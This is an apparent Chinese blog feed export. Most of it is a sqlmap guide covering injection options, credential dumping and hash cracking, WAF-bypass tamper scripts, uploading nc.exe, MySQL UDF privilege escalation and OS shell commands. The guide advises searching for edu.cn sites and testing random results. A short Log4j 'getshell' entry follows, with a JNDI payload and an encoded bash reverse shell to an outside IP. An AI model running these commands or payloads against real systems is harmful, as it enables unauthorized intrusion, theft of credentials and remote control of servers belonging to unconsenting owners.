<li>–prefix=PREFIX     注入payload字符串前缀</li>
<li>–suffix=SUFFIX     注入payload字符串后缀</li>
<li>–tamper=TAMPER   使用给定的脚本篡改注入数据</li>
</ul>
<h3 id="1-3-6-检测"><a href="#1-3-6-检测" class="headerlink" title="1.3.6 检测"></a>1.3.6 检测</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
<ul>
<li>–level=LEVEL     执行测试的等级（1-5，默认为1）</li>
<li>–risk=RISK       执行测试的风险（0-3，默认为1）</li>
<li>–string=STRING    查询时有效时在页面匹配字符串</li>
<li>–not-string=NOT..  当查询求值为无效时匹配的字符串</li>
<li>–regexp=REGEXP     查询时有效时在页面匹配正则表达式</li>
<li>–code=CODE       当查询求值为True时匹配的HTTP代码</li>
<li>–text-only        仅基于在文本内容比较网页</li>
<li>–titles           仅根据他们的标题进行比较</li>
</ul>
<h3 id="1-3-7-技巧"><a href="#1-3-7-技巧" class="headerlink" title="1.3.7 技巧"></a>1.3.7 技巧</h3><p>这些选项可用于调整具体的SQL注入测试</p>
<ul>
<li>–technique=TECH    SQL注入技术测试（默认BEUST）</li>
<li>–time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）</li>
<li>–union-cols=UCOLS  定列范围用于测试UNION查询注入</li>
<li>–union-char=UCHAR  暴力猜测列的字符数</li>
<li>–union-from=UFROM  SQL注入UNION查询使用的格式</li>
<li>–dns-domain=DNS..  DNS泄露攻击使用的域名</li>
<li>–second-order=S..  URL搜索产生的结果页面</li>
</ul>
<h3 id="1-3-8-指纹"><a href="#1-3-8-指纹" class="headerlink" title="1.3.8 指纹"></a>1.3.8 指纹</h3><ul>
<li>-f, –fingerprint   执行广泛的DBMS版本指纹检查</li>
</ul>
<h3 id="1-3-9-枚举"><a href="#1-3-9-枚举" class="headerlink" title="1.3.9 枚举"></a>1.3.9 枚举</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p>
<ul>
<li>-a, –all           获取所有信息</li>
<li>-b, –banner        获取数据库管理系统的标识</li>
<li>–current-user      获取数据库管理系统当前用户</li>
<li>–current-db        获取数据库管理系统当前数据库</li>
<li>–hostname         获取数据库服务器的主机名称</li>
<li>–is-dba            检测DBMS当前用户是否DBA</li>
<li>–users             枚举数据库管理系统用户</li>
<li>–passwords         枚举数据库管理系统用户密码哈希</li>
<li>–privileges        枚举数据库管理系统用户的权限</li>
<li>–roles            枚举数据库管理系统用户的角色</li>
<li>–dbs             枚举数据库管理系统数据库</li>
<li>–tables            枚举的DBMS数据库中的表</li>
<li>–columns          枚举DBMS数据库表列</li>
<li>–schema            枚举数据库架构</li>
<li>–count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb</li>
<li>–dump            转储数据库表项</li>
<li>–dump-all          转储数据库所有表项</li>
<li>–search           搜索列（S），表（S）和/或数据库名称（S）</li>
<li>–comments          获取DBMS注释</li>
<li>-D DB               要进行枚举的指定数据库名</li>
<li>-T TBL              DBMS数据库表枚举</li>
<li>-C COL             DBMS数据库表列枚举</li>
<li>-X EXCLUDECOL     DBMS数据库表不进行枚举</li>
<li>-U USER           用来进行枚举的数据库用户</li>
<li>–exclude-sysdbs    枚举表时排除系统数据库</li>
<li>–pivot-column=P..  Pivot columnname</li>
<li>–where=DUMPWHERE   Use WHEREcondition while table dumping</li>
<li>–start=LIMITSTART  获取第一个查询输出数据位置</li>
<li>–stop=LIMITSTOP   获取最后查询的输出数据</li>
<li>–first=FIRSTCHAR   第一个查询输出字的字符获取</li>
<li>–last=LASTCHAR    最后查询的输出字字符获取</li>
<li>–sql-query=QUERY   要执行的SQL语句</li>
<li>–sql-shell         提示交互式SQL的shell</li>
<li>–sql-file=SQLFILE  要执行的SQL文件</li>
</ul>
<h3 id="1-3-10-暴力"><a href="#1-3-10-暴力" class="headerlink" title="1.3.10 暴力"></a>1.3.10 暴力</h3><p>这些选项可以被用来运行暴力检查</p>
<ul>
<li>–common-tables     检查存在共同表</li>
<li>–common-columns    检查存在共同列</li>
</ul>
<h3 id="1-3-11-用户自定义函数注入"><a href="#1-3-11-用户自定义函数注入" class="headerlink" title="1.3.11 用户自定义函数注入"></a>1.3.11 用户自定义函数注入</h3><p>这些选项可以用来创建用户自定义函数</p>
<ul>
<li>–udf-inject    注入用户自定义函数</li>
<li>–shared-lib=SHLIB  共享库的本地路径</li>
</ul>
<h3 id="1-3-12-访问文件系统"><a href="#1-3-12-访问文件系统" class="headerlink" title="1.3.12 访问文件系统"></a>1.3.12 访问文件系统</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p>
<ul>
<li><p>–file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe: <code>sqlmap.py -</code></p>
<pre><code>u"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"--file-read "C:/example.exe" -v 1</code></pre>
</li>
</ul>
<ul>
<li><p>–file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件</p>
</li>
<li><p>–file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径</p>
</li>
</ul>
<p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：</p>
<pre><code>python sqlmap.py -u"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write"/software/nc.exe" --file-dest "C:/WINDOWS/Temp/nc.exe" -v1</code></pre>
<h3 id="1-3-13-操作系统访问"><a href="#1-3-13-操作系统访问" class="headerlink" title="1.3.13 操作系统访问"></a>1.3.13 操作系统访问</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
<ul>
<li>–os-cmd=OSCMD   执行操作系统命令（OSCMD）</li>
<li>–os-shell          交互式的操作系统的shell</li>
<li>–os-pwn          获取一个OOB shell，meterpreter或VNC</li>
<li>–os-smbrelay       一键获取一个OOBshell，meterpreter或VNC</li>
<li>–os-bof           存储过程缓冲区溢出利用</li>
<li>–priv-esc          数据库进程用户权限提升</li>
<li>–msf-path=MSFPATH  MetasploitFramework本地的安装路径</li>
<li>–tmp-path=TMPPATH  远程临时文件目录的绝对路径</li>
</ul>
<p>linux查看当前用户命令：</p>
<pre><code>sqlmap.py -u"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --os-cmd id -v1</code></pre>
<h3 id="1-3-14-Windows注册表访问"><a href="#1-3-14-Windows注册表访问" class="headerlink" title="1.3.14 Windows注册表访问"></a>1.3.14 Windows注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表</p>
<ul>
<li>–reg-read          读一个Windows注册表项值</li>
<li>–reg-add           写一个Windows注册表项值数据</li>
<li>–reg-del           删除Windows注册表键值</li>
<li>–reg-key=REGKEY    Windows注册表键</li>
<li>–reg-value=REGVAL  Windows注册表项值</li>
<li>–reg-data=REGDATA  Windows注册表键值数据</li>
<li>–reg-type=REGTYPE  Windows注册表项值类型</li>
</ul>
<h3 id="1-3-15-一般选项"><a href="#1-3-15-一般选项" class="headerlink" title="1.3.15 一般选项"></a>1.3.15 一般选项</h3><p>这些选项可以用来设置一些一般的工作参数</p>
<ul>
<li>-s SESSIONFILE     保存和恢复检索会话文件的所有数据</li>
<li>-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中</li>
<li>–batch            从不询问用户输入，使用所有默认配置。</li>
<li>–binary-fields=..  结果字段具有二进制值(e.g.”digest”)</li>
<li>–charset=CHARSET   强制字符编码</li>
<li>–crawl=CRAWLDEPTH  从目标URL爬行网站</li>
<li>–crawl-exclude=..  正则表达式从爬行页中排除</li>
<li>–csv-del=CSVDEL    限定使用CSV输出 (default”,”)</li>
<li>–dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)</li>
<li>–eta              显示每个输出的预计到达时间</li>
<li>–flush-session     刷新当前目标的会话文件</li>
<li>–forms           解析和测试目标URL表单</li>
<li>–fresh-queries     忽略在会话文件中存储的查询结果</li>
<li>–hex             使用DBMS Hex函数数据检索</li>
<li>–output-dir=OUT..  自定义输出目录路径</li>
<li>–parse-errors      解析和显示响应数据库错误信息</li>
<li>–save=SAVECONFIG   保存选项到INI配置文件</li>
<li>–scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标</li>
<li>–test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)</li>
<li>–test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)</li>
<li>–update            更新sqlmap</li>
</ul>
<h3 id="1-3-16-其他"><a href="#1-3-16-其他" class="headerlink" title="1.3.16 其他"></a>1.3.16 其他</h3><ul>
<li>-z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</li>
<li>–alert=ALERT       发现SQL注入时，运行主机操作系统命令</li>
<li>–answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;">http://192.168.22.128/get_int.php?id=1"--technique=E--answers="extending=N"</a>    –batch</li>
<li>–beep    发现sql注入时，发出蜂鸣声。</li>
<li>–cleanup     清除sqlmap注入时在DBMS中产生的udf与表。</li>
<li>–dependencies      Check formissing (non-core) sqlmap dependencies</li>
<li>–disable-coloring  默认彩色输出，禁掉彩色输出。</li>
<li>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</li>
<li>–identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</li>
<li>–mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</li>
<li>–offline           Work inoffline mode (only use session data)</li>
<li>–purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</li>
<li>–skip-waf           跳过WAF／IPS / IDS启发式检测保护</li>
<li>–smart            进行积极的启发式测试，快速判断为注入的报错点进行注入</li>
<li>–sqlmap-shell      互动提示一个sqlmapshell</li>
<li>–tmp-dir=TMPDIR    用于存储临时文件的本地目录</li>
<li>–web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)</li>
<li>–wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li>
</ul>
<h2 id="1-4-实际利用"><a href="#1-4-实际利用" class="headerlink" title="1.4 实际利用"></a>1.4 实际利用</h2><h3 id="1-4-1-检测和利用SQL注入"><a href="#1-4-1-检测和利用SQL注入" class="headerlink" title="1.4.1 检测和利用SQL注入"></a>1.4.1 检测和利用SQL注入</h3><p><strong>1. 手工判断是否存在漏洞</strong></p>
<p>对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。</p>
<p>原始网页：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>构造url1：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</a></p>
<p>构造url2：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</a></p>
<p>如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。</p>
<p><strong>2. sqlmap自动检测</strong></p>
<p>检测语法：sqlmap.py -u <a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。</p>
<ol start="3">
<li><strong>寻找和判断实例</strong></li>
</ol>
<p>通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id=  site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn。随机打开一个网页搜索结果，如果能够正常访问，则复制该URL地址。</p>
<p>将该url使用sqlmap进行注入测试，，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。</p>
<ol start="4">
<li><p><strong>批量检测</strong></p>
<p>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。</p>
</li>
</ol>
<h3 id="1-4-2-直接连接数据库"><a href="#1-4-2-直接连接数据库" class="headerlink" title="1.4.2 直接连接数据库"></a>1.4.2 直接连接数据库</h3><blockquote>
<pre><code>sqlmap.py -d"mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs--users</code></pre>
</blockquote>
<h3 id="1-4-3数据库相关操作"><a href="#1-4-3数据库相关操作" class="headerlink" title="1.4.3数据库相关操作"></a>1.4.3数据库相关操作</h3><ul>
<li>列数据库信息：–dbs</li>
<li>web当前使用的数据库–current-db</li>
<li>web数据库使用账户–current-user</li>
<li>列出sqlserver所有用户 –users</li>
<li>数据库账户与密码 –passwords</li>
<li>指定库名列出所有表  -D database –tables<ul>
<li>-D：指定数据库名称</li>
</ul>
</li>
<li>指定库名表名列出所有字段 -D antian365-T admin –columns<ul>
<li>-T：指定要列出字段的表</li>
</ul>
</li>
<li>指定库名表名字段dump出指定字段<ul>
<li>-D secbang_com -T admin -C  id,password ,username –dump</li>
<li>-D antian365 -T userb -C”email,Username,userpassword” –dump</li>
<li>可加双引号，也可不加双引号。</li>
</ul>
</li>
<li>导出多少条数据<ul>
<li>-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump （）</li>
<li>参数：<ul>
<li>–start：指定开始的行</li>
<li>–stop：指定结束的行</li>
</ul>
</li>
<li>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</li>
</ul>
</li>
</ul>
<h2 id="1-5-SQLMAP实用技巧"><a href="#1-5-SQLMAP实用技巧" class="headerlink" title="1.5 SQLMAP实用技巧"></a>1.5 SQLMAP实用技巧</h2><h3 id="15-1-mysql的注释方法进行绕过WAF进行SQL注入"><a href="#15-1-mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="15.1 mysql的注释方法进行绕过WAF进行SQL注入"></a>15.1 mysql的注释方法进行绕过WAF进行SQL注入</h3><ol>
<li>修改 C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py</li>
</ol>
<pre class=" language-python"><code class="language-python">
<span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>word<span class="token punctuation">,</span><span class="token string">"/*!0%s"</span> <span class="token operator">%</span> word<span class="token punctuation">)</span> 为：

<span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>word<span class="token punctuation">,</span><span class="token string">"/*!50000%s*/"</span> <span class="token operator">%</span> word<span class="token punctuation">)</span></code></pre>
<ol>
<li>修改C:\Python27\sqlmap\xml\queries.xml</li>
</ol>
<pre class=" language-xml"><code class="language-xml">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cast</span> <span class="token attr-name">query</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>CAST(%s ASCHAR)<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>为：

&lt;castquery="convert(%s,CHAR)"/></code></pre>
<ol>
<li>使用sqlmap进行注入测试</li>
</ol>
<pre><code>sqlmap.py -u"http://**.com/detail.php? id=16" –tamper "halfversionedmorekeywords.py"</code></pre>
<p>其它绕过waf脚本方法：</p>
<pre><code>sqlmap.py-u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</code></pre>
<ol>
<li>tamper目录下文件具体含义：</li>
</ol>
<pre class=" language-sql"><code class="language-sql">space2comment<span class="token punctuation">.</span>py用<span class="token comment" spellcheck="true">/**/</span>代替空格

apostrophemask<span class="token punctuation">.</span>py用utf8代替引号

equaltolike<span class="token punctuation">.</span>pylike代替等号

space2dash<span class="token punctuation">.</span>py　绕过过滤‘<span class="token operator">=</span>’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）

greatest<span class="token punctuation">.</span>py　绕过过滤’<span class="token operator">></span>’ <span class="token punctuation">,</span>用GREATEST替换大于号。

space2hash<span class="token punctuation">.</span>py空格替换为<span class="token comment" spellcheck="true">#号,随机字符串以及换行符</span>

apostrophenullencode<span class="token punctuation">.</span>py绕过过滤双引号，替换字符和双引号。

halfversionedmorekeywords<span class="token punctuation">.</span>py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash<span class="token punctuation">.</span>py空格替换为 <span class="token comment" spellcheck="true">#号 以及更多随机字符串 换行符</span>

appendnullbyte<span class="token punctuation">.</span>py在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull<span class="token punctuation">.</span>py　绕过对IFNULL过滤<span class="token punctuation">,</span>替换类似’IFNULL<span class="token punctuation">(</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span>’为’<span class="token keyword">IF</span><span class="token punctuation">(</span>ISNULL<span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">,</span> B<span class="token punctuation">,</span> A<span class="token punctuation">)</span>’

space2mssqlblank<span class="token punctuation">.</span>py<span class="token punctuation">(</span>mssql<span class="token punctuation">)</span>空格替换为其它空符号

base64encode<span class="token punctuation">.</span>py　用base64编码替换

space2mssqlhash<span class="token punctuation">.</span>py　替换空格

modsecurityversioned<span class="token punctuation">.</span>py过滤空格，包含完整的查询版本注释

space2mysqlblank<span class="token punctuation">.</span>py　空格替换其它空白符号<span class="token punctuation">(</span>mysql<span class="token punctuation">)</span>

<span class="token operator">between</span><span class="token punctuation">.</span>py用<span class="token operator">between</span>替换大于号（<span class="token operator">></span>）

space2mysqldash<span class="token punctuation">.</span>py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

multiplespaces<span class="token punctuation">.</span>py围绕SQL关键字添加多个空格

space2plus<span class="token punctuation">.</span>py用<span class="token operator">+</span>替换空格

bluecoat<span class="token punctuation">.</span>py代替空格字符后与一个有效的随机空白字符的SQL语句<span class="token punctuation">,</span>然后替换<span class="token operator">=</span>为<span class="token operator">like</span>

nonrecursivereplacement<span class="token punctuation">.</span>py双重查询语句<span class="token punctuation">,</span>取代SQL关键字

space2randomblank<span class="token punctuation">.</span>py代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password<span class="token punctuation">.</span>py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾

chardoubleencode<span class="token punctuation">.</span>py双url编码<span class="token punctuation">(</span>不处理以编码的<span class="token punctuation">)</span>

unionalltounion<span class="token punctuation">.</span>py替换<span class="token keyword">UNION</span> ALLSELECT <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span>

charencode<span class="token punctuation">.</span>py　url编码

randomcase<span class="token punctuation">.</span>py随机大小写

unmagicquotes<span class="token punctuation">.</span>py宽字符绕过 GPCaddslashes

randomcomments<span class="token punctuation">.</span>py用<span class="token comment" spellcheck="true">/**/</span>分割sql关键字

charunicodeencode<span class="token punctuation">.</span>py字符串 unicode 编码

securesphere<span class="token punctuation">.</span>py追加特制的字符串

versionedmorekeywords<span class="token punctuation">.</span>py注释绕过

space2comment<span class="token punctuation">.</span>py替换空格字符串<span class="token punctuation">(</span>‘‘<span class="token punctuation">)</span> 使用注释‘<span class="token comment" spellcheck="true">/**/</span>’

halfversionedmorekeywords<span class="token punctuation">.</span>py关键字前加注释</code></pre>
<h3 id="15-2-URL重写SQL注入测试"><a href="#15-2-URL重写SQL注入测试" class="headerlink" title="15.2 URL重写SQL注入测试"></a>15.2 URL重写SQL注入测试</h3><p>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</p>
<pre><code>sqlmap.py -u"http://targeturl/param1/value1*/param2/value2/"</code></pre>
<h3 id="15-3-列举并破解密码哈希值"><a href="#15-3-列举并破解密码哈希值" class="headerlink" title="15.3 列举并破解密码哈希值"></a>15.3 列举并破解密码哈希值</h3><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<pre><code>sqlmap.py -u"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v1</code></pre>
<h3 id="15-4-获取表中的数据个数"><a href="#15-4-获取表中的数据个数" class="headerlink" title="15.4 获取表中的数据个数"></a>15.4 获取表中的数据个数</h3><pre><code>sqlmap.py -u"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -Dtestdb</code></pre>
<h3 id="15-5-对网站secbang-com进行漏洞爬取"><a href="#15-5-对网站secbang-com进行漏洞爬取" class="headerlink" title="15.5 对网站secbang.com进行漏洞爬取"></a>15.5 对网站secbang.com进行漏洞爬取</h3><pre><code>sqlmap.py -u "http://www.secbang.com"--batch --crawl=3</code></pre>
<h3 id="15-6-基于布尔SQL注入预估时间"><a href="#15-6-基于布尔SQL注入预估时间" class="headerlink" title="15.6 基于布尔SQL注入预估时间"></a>15.6 基于布尔SQL注入预估时间</h3><pre><code>sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1"-b --eta</code></pre>
<h3 id="15-7-使用hex避免字符编码导致数据丢失"><a href="#15-7-使用hex避免字符编码导致数据丢失" class="headerlink" title="15.7 使用hex避免字符编码导致数据丢失"></a>15.7 使用hex避免字符编码导致数据丢失</h3><pre><code>sqlmap.py -u "http://192.168.48.130/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors</code></pre>
<h3 id="15-8-模拟测试手机环境站点"><a href="#15-8-模拟测试手机环境站点" class="headerlink" title="15.8.模拟测试手机环境站点"></a>15.8.模拟测试手机环境站点</h3><pre><code>python sqlmap.py -u"http://www.target.com/vuln.php?id=1" --mobile</code></pre>
<h3 id="15-9-智能判断测试"><a href="#15-9-智能判断测试" class="headerlink" title="15.9 智能判断测试"></a>15.9 智能判断测试</h3><pre><code>sqlmap.py -u "http://www.antian365.com/info.php?id=1"--batch --smart</code></pre>
<h3 id="15-10-结合burpsuite进行注入"><a href="#15-10-结合burpsuite进行注入" class="headerlink" title="15.10 结合burpsuite进行注入"></a>15.10 结合burpsuite进行注入</h3><ol>
<li>burpsuite抓包，需要设置burpsuite记录请求日志</li>
</ol>
<pre><code>sqlmap.py -r burpsuite抓包.txt</code></pre>
<ol>
<li>指定表单注入</li>
</ol>
<pre><code>sqlmap.py -u URL --data“username=a&amp;password=a”</code></pre>
<h3 id="15-11-sqlmap自动填写表单注入"><a href="#15-11-sqlmap自动填写表单注入" class="headerlink" title="15.11 sqlmap自动填写表单注入"></a>15.11 sqlmap自动填写表单注入</h3><p>自动填写表单：</p>
<pre class=" language-css"><code class="language-css">sqlmap<span class="token number">.</span>py -u URL --forms 

sqlmap<span class="token number">.</span>py -u URL --forms --dbs

sqlmap<span class="token number">.</span>py -u URL --forms --current-db

sqlmap<span class="token number">.</span>py -u URL --forms -D 数据库名称--tables

sqlmap<span class="token number">.</span>py -u URL --forms -D 数据库名称 -T 表名 --columns

sqlmap<span class="token number">.</span>py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump</code></pre>
<h3 id="15-12读取linux下文件"><a href="#15-12读取linux下文件" class="headerlink" title="15.12读取linux下文件"></a>15.12读取linux下文件</h3><pre><code>sqlmap.py-u "url" --file /etc/password</code></pre>
<h3 id="15-13-延时注入"><a href="#15-13-延时注入" class="headerlink" title="15.13 延时注入"></a>15.13 延时注入</h3><pre><code>sqlmap.py -u URL --technique -T--current-user</code></pre>
<h3 id="15-14-sqlmap-结合burpsuite进行post注入"><a href="#15-14-sqlmap-结合burpsuite进行post注入" class="headerlink" title="15.14 sqlmap 结合burpsuite进行post注入"></a>15.14 sqlmap 结合burpsuite进行post注入</h3><p>结合burpsuite来使用sqlmap：</p>
<ol>
<li>浏览器打开目标地址<a href="http://www.antian365.com/">http://www.antian365.com</a></li>
<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
<li>点击登录表单的submit按钮</li>
<li>Burp会拦截到了我们的登录POST请求</li>
<li>把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</li>
<li>运行sqlmap并使用如下命令：<br> <code>./sqlmap.py -r post.txt -p tfUPass</code></li>
</ol>
<h3 id="15-15-sqlmap-cookies注入"><a href="#15-15-sqlmap-cookies注入" class="headerlink" title="15.15 sqlmap cookies注入"></a>15.15 sqlmap cookies注入</h3><pre><code>sqlmap.py -u "http://127.0.0.1/base.PHP"–cookies "id=1"  –dbs –level 2</code></pre>
<p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level  参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p>
<pre class=" language-perl"><code class="language-perl">sqlmap<span class="token operator">.</span>py <span class="token operator">-u</span> 注入点URL <span class="token operator">--</span>cookie<span class="token string">"id=xx"</span> <span class="token operator">--</span>level <span class="token number">3</span>

sqlmap<span class="token operator">.</span>py <span class="token operator">-u</span> url <span class="token operator">--</span>cookie <span class="token string">"id=xx"</span><span class="token operator">--</span>level <span class="token number">3</span> <span class="token operator">--</span>tables<span class="token punctuation">(</span>猜表名<span class="token punctuation">)</span>

sqlmap<span class="token operator">.</span>py <span class="token operator">-u</span> url <span class="token operator">--</span>cookie <span class="token string">"id=xx"</span><span class="token operator">--</span>level <span class="token number">3</span> <span class="token operator">-T</span> 表名 <span class="token operator">--</span>coiumns

sqlmap<span class="token operator">.</span>py <span class="token operator">-u</span> url <span class="token operator">--</span>cookie <span class="token string">"id=xx"</span><span class="token operator">--</span>level <span class="token number">3</span> <span class="token operator">-T</span> 表名 <span class="token operator">-C</span> username，password <span class="token operator">--</span>dump</code></pre>
<h3 id="15-16-mysql提权"><a href="#15-16-mysql提权" class="headerlink" title="15.16 mysql提权"></a>15.16 mysql提权</h3><ol>
<li>连接mysql数据打开一个交互shell:</li>
</ol>
<pre class=" language-sql"><code class="language-sql">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>dmysql:<span class="token comment" spellcheck="true">//root:root@127.0.0.1:3306/test --sql-shell</span>

<span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">;</span>

<span class="token keyword">select</span> @<span class="token variable">@plugin_dir</span><span class="token punctuation">;</span>

<span class="token number">d</span>:\\wamp2<span class="token number">.5</span>\\bin\\mysql\\mysql5<span class="token number">.6</span><span class="token punctuation">.</span><span class="token number">17</span>\\lib\\plugin\\</code></pre>
<ol>
<li>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</li>
</ol>
<pre class=" language-sql"><code class="language-sql">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>dmysql:<span class="token comment" spellcheck="true">//root:root@127.0.0.1:3306/test --file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll</span>

<span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_exec <span class="token keyword">RETURNS</span> STRINGSONAME <span class="token string">'lib_mysqludf_sys.dll'</span>

<span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRINGSONAME <span class="token string">'lib_mysqludf_sys.dll'</span>

<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'ver'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<h3 id="15-17-执行shell命令"><a href="#15-17-执行shell命令" class="headerlink" title="15.17 执行shell命令"></a>15.17 执行shell命令</h3><pre class=" language-mipsasm"><code class="language-mipsasm">sqlmap.py -u "url" –os-cmd="netuser" /*执行net user命令*/

sqlmap.py -u "url" –os-shell /*系统交互的shell*/</code></pre>
<h3 id="15-18-延时注入"><a href="#15-18-延时注入" class="headerlink" title="15.18 延时注入"></a>15.18 延时注入</h3><pre class=" language-python"><code class="language-python">sqlmap –dbs <span class="token operator">-</span>u<span class="token string">"url"</span> –delay <span class="token number">0.5</span> <span class="token operator">/</span><span class="token operator">*</span>延时<span class="token number">0.5</span>秒<span class="token operator">*</span><span class="token operator">/</span>

sqlmap –dbs <span class="token operator">-</span>u<span class="token string">"url"</span> –safe<span class="token operator">-</span>freq <span class="token operator">/</span><span class="token operator">*</span>请求<span class="token number">2</span>次<span class="token operator">*</span><span class="token operator">/</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>apache log4j漏洞 getshell记录</title>
    <url>/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/</url>
    <content><![CDATA[<pre><code>${jndi:ldap://f52k7t.dnslog.cn}</code></pre>
<pre><code>java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 1.15.155.126 -p 2333</code></pre>
<p><img src="/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/1.png" alt="1"></p>
<p><img src="/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/2.png" alt="2"></p>
<pre><code>c=${jndi:ldap://1.15.155.126:1389/Basic/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xLjE1LjE1NS4xMjYvMTA5OSAwPiYx}</code></pre>
